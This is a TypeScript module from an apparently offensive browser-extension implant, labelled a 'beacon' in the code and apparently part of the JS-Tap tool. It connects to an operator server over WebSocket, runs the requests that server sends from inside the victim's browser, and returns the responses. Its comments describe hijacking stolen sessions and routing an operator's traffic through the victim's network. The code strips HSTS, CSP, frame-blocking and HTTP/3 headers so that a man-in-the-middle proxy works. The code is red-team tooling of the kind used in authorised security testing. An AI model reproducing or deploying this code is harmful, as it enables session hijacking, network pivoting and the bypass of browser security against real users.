import { CONFIG } from './config';

let ws: WebSocket | null = null;
let proxyActive = false;
let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
let pingTimer: ReturnType<typeof setInterval> | null = null;

// Buffer for responses that completed while WS was disconnected
let pendingResponses: string[] = [];

// Concurrency limiter — prevents proxy fetches from saturating the service
// worker's networking and starving the beacon's own heartbeat/telemetry channel.
const MAX_CONCURRENT_FETCHES = 8;
let activeFetches = 0;
let fetchQueue: Array<{ resolve: () => void }> = [];

function acquireFetchSlot(): Promise<void> {
  if (activeFetches < MAX_CONCURRENT_FETCHES) {
    activeFetches++;
    return Promise.resolve();
  }
  return new Promise((resolve) => {
    fetchQueue.push({ resolve });
  });
}

function releaseFetchSlot(): void {
  const next = fetchQueue.shift();
  if (next) {
    // Hand the slot directly to the next waiter (activeFetches stays the same)
    next.resolve();
  } else {
    activeFetches--;
  }
}



export function isProxyActive(): boolean {
  return proxyActive;
}


export function startProxy(sessionUUID: string): void {
  if (proxyActive && ws) {
    console.log("BEX Proxy: Already active");
    return;
  }

  proxyActive = true;
  connectWebSocket(sessionUUID);
}


export function stopProxy(): void {
  proxyActive = false;
  pendingResponses = [];
  fetchQueue = [];
  activeFetches = 0;

  if (pingTimer) {
    clearInterval(pingTimer);
    pingTimer = null;
  }
  if (reconnectTimer) {
    clearTimeout(reconnectTimer);
    reconnectTimer = null;
  }
  if (ws) {
    try { ws.close(); } catch (_) {}
    ws = null;
  }

  console.log("BEX Proxy: Stopped");
}


function connectWebSocket(sessionUUID: string): void {
  if (!proxyActive) return;

  // Build WSS URL from the server URL
  const serverUrl = CONFIG.serverUrl;
  const wsUrl = serverUrl.replace(/^http/, 'ws') + '/ws/proxy/' + sessionUUID;

  console.log("BEX Proxy: Connecting to", wsUrl);

  try {
    ws = new WebSocket(wsUrl);
  } catch (e) {
    console.error("BEX Proxy: WebSocket creation failed:", e);
    scheduleReconnect(sessionUUID);
    return;
  }

  ws.onopen = () => {
    console.log("BEX Proxy: WebSocket connected");

    // Drain any responses that were buffered while disconnected
    if (pendingResponses.length > 0) {
      console.log(`BEX Proxy: Draining ${pendingResponses.length} buffered responses`);
      const toSend = pendingResponses.splice(0);
      for (const msg of toSend) {
        try {
          ws!.send(msg);
        } catch (e) {
          console.error("BEX Proxy: Failed to drain buffered response:", e);
        }
      }
    }

    // Keep-alive ping every 10s to prevent Chrome service worker from killing us
    if (pingTimer) clearInterval(pingTimer);
    pingTimer = setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'ping' }));
      }
    }, 10000);
  };

  ws.onmessage = async (event) => {
    try {
      const data = JSON.parse(event.data);

      if (data.type === 'pong') return;

      // It's a proxy request from JS-Tap server
      if (data.id && data.method && data.url) {
        console.log(`BEX Proxy: Received request: ${data.method} ${data.url} id=${data.id} (queue: ${fetchQueue.length}, active: ${activeFetches}/${MAX_CONCURRENT_FETCHES})`);

        // Wait for a fetch slot (throttles concurrency to protect heartbeat channel)
        await acquireFetchSlot();
        let response;
        try {
          response = await handleProxyRequest(data);
        } finally {
          releaseFetchSlot();
        }

        const responseMsg = JSON.stringify(response);
        console.log("BEX Proxy: Sending response: status=" + response.status, "id=" + response.id);
        if (ws && ws.readyState === WebSocket.OPEN) {
          ws.send(responseMsg);
          console.log("BEX Proxy: Response sent over WS");
        } else {
          console.log("BEX Proxy: WS not open, buffering response for id=" + response.id);
          pendingResponses.push(responseMsg);
        }
      } else {
        console.log("BEX Proxy: Unrecognized message:", JSON.stringify(data).substring(0, 200));
      }
    } catch (e) {
      console.error("BEX Proxy: Error handling message:", e);
    }
  };

  ws.onclose = () => {
    console.log("BEX Proxy: WebSocket closed");
    ws = null;
    if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
    scheduleReconnect(sessionUUID);
  };

  ws.onerror = (err) => {
    console.error("BEX Proxy: WebSocket error:", err);
  };
}


function scheduleReconnect(sessionUUID: string): void {
  if (!proxyActive) return;
  if (reconnectTimer) clearTimeout(reconnectTimer);

  reconnectTimer = setTimeout(() => {
    console.log("BEX Proxy: Attempting reconnect...");
    connectWebSocket(sessionUUID);
  }, 3000);
}


/**
 * Handle an incoming proxy request: execute the fetch from this browser.
 *
 * "Dumb pipe" strategy — the beacon forwards exactly what the MITM proxy
 * sends and does NOT inject or modify cookies.  This keeps the beacon
 * composable with four operator workflows:
 *
 *  1. Proxy only          — route through victim's network, unauthenticated.
 *  2. Session ticket only  — steal session, browse directly (no proxy).
 *  3. Proxy + session ticket — route through victim's network WITH stolen
 *     session.  The Conductor injects cookies/headers/storage/UA into the
 *     operator's browser; the MITM proxy forwards those headers here.
 *  4. Proxy + own login   — operator logs in manually; their session cookies
 *     flow through the MITM proxy naturally.
 *
 * Credentials mode is chosen per-request: if the MITM proxy forwarded a
 * Cookie header, `credentials: 'include'` is used so fetch() actually sends
 * it (Firefox strips manually-set Cookie headers under 'omit').  If no
 * Cookie header was forwarded, `credentials: 'omit'` prevents the victim's
 * browser cookie jar from contaminating the request.
 */
async function handleProxyRequest(req: {
  id: string;
  method: string;
  url: string;
  headers: Record<string, string>;
  body: string | null;
}): Promise<any> {
  try {
    const url = new URL(req.url);

    // Build the headers for the outgoing fetch
    const fetchHeaders: Record<string, string> = {};

    // Copy original headers, skipping hop-by-hop and problematic ones
    const skipHeaders = new Set([
      'host', 'connection', 'proxy-connection', 'proxy-authorization',
      'te', 'trailer', 'transfer-encoding', 'upgrade',
      'keep-alive', 'accept-encoding',
    ]);

    for (const [k, v] of Object.entries(req.headers)) {
      if (!skipHeaders.has(k.toLowerCase())) {
        fetchHeaders[k] = v;
      }
    }

    // Determine credentials mode based on whether a Cookie header was forwarded.
    // 'omit'    = no cookies at all (proxy-only: unauthenticated)
    // 'include' = send cookies (proxy+session / proxy+own-login: the Cookie header
    //             was injected by the Conductor and forwarded through the MITM proxy;
    //             'omit' would strip it because Firefox treats "no cookies" literally)
    const hasCookieHeader = Object.keys(fetchHeaders).some(k => k.toLowerCase() === 'cookie');
    const credentialsMode: RequestCredentials = hasCookieHeader ? 'include' : 'omit';

    // Build fetch options with a 30s timeout
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000);

    const fetchOpts: RequestInit = {
      method: req.method,
      headers: fetchHeaders,
      redirect: 'follow', // Follow redirects — 'manual' produces opaque status=0 responses
      signal: controller.signal,
      credentials: credentialsMode,
    };

    if (req.body && req.method !== 'GET' && req.method !== 'HEAD') {
      fetchOpts.body = Uint8Array.from(atob(req.body), c => c.charCodeAt(0));
    }

    // DEBUG: Log what the MITM proxy forwarded to us
    const cookieVal = fetchHeaders['Cookie'] || fetchHeaders['cookie'] || 'NONE';
    console.log(`BEX Proxy DEBUG: ${req.method} ${url.pathname.substring(0, 60)} | Cookie from MITM: ${cookieVal !== 'NONE' ? cookieVal.substring(0, 100) + '...' : 'NONE'} | credentials: ${credentialsMode}`);
    console.log(`BEX Proxy DEBUG: All headers from MITM:`, JSON.stringify(Object.keys(req.headers)));

    console.log("BEX Proxy: Fetching", req.method, req.url);
    const resp = await fetch(req.url, fetchOpts);
    clearTimeout(timeoutId);
    console.log("BEX Proxy: Fetch complete, status=" + resp.status);

    // If the fetch followed a redirect to a different origin, send a redirect
    // back so the operator's browser handles it properly (correct cookies, origin, etc.)
    if (resp.redirected && new URL(resp.url).origin !== url.origin) {
      console.log("BEX Proxy: Cross-origin redirect detected:", req.url, "->", resp.url);
      return {
        type: 'response',
        id: req.id,
        status: 302,
        headers: {
          'Location': resp.url,
          'Content-Length': '0',
        },
        body: '',
      };
    }

    // Read the response body as ArrayBuffer then base64 encode
    const bodyBuffer = await resp.arrayBuffer();
    const bodyBytes = new Uint8Array(bodyBuffer);
    let bodyB64 = '';
    if (bodyBytes.length > 0) {
      // Convert to base64 in chunks to avoid call stack overflow on large responses
      bodyB64 = arrayBufferToBase64Sync(bodyBytes);
    }

    // Collect response headers, skipping hop-by-hop and headers that break MITM
    const stripHeaders = new Set([
      'transfer-encoding', 'content-encoding', 'content-length',
      'set-cookie',      // extracted separately below
      'alt-svc',         // prevents HTTP/3 (QUIC/UDP) which bypasses TCP proxy
      'strict-transport-security',  // HSTS pins certs that won't match MITM CA
      'content-security-policy',    // CSP blocks scripts whose context changed via MITM
      'content-security-policy-report-only',
      'x-content-security-policy',
      'x-frame-options',
    ]);
    const respHeaders: Record<string, string> = {};
    resp.headers.forEach((v, k) => {
      if (stripHeaders.has(k.toLowerCase())) return;
      respHeaders[k] = v;
    });

    // Extract Set-Cookie headers individually so the proxy can write them as separate header lines
    const setCookies = resp.headers.getSetCookie ? resp.headers.getSetCookie() : [];

    // Set correct Content-Length for the decoded body
    respHeaders['Content-Length'] = String(bodyBytes.length);

    return {
      type: 'response',
      id: req.id,
      status: resp.status,
      headers: respHeaders,
      setCookies: setCookies.length > 0 ? setCookies : undefined,
      body: bodyB64,
    };
  } catch (e: any) {
    console.error("BEX Proxy: Fetch failed for", req.url, e);
    return {
      type: 'response',
      id: req.id,
      status: 502,
      headers: { 'Content-Type': 'text/plain' },
      body: btoa('Proxy fetch error: ' + (e.message || String(e))),
    };
  }
}


/**
 * Synchronous base64 encoding that handles large buffers without stack overflow.
 */
function arrayBufferToBase64Sync(bytes: Uint8Array): string {
  const chunkSize = 32768;
  let binary = '';
  for (let i = 0; i < bytes.length; i += chunkSize) {
    const chunk = bytes.subarray(i, Math.min(i + chunkSize, bytes.length));
    binary += String.fromCharCode.apply(null, chunk as any);
  }
  return btoa(binary);
}
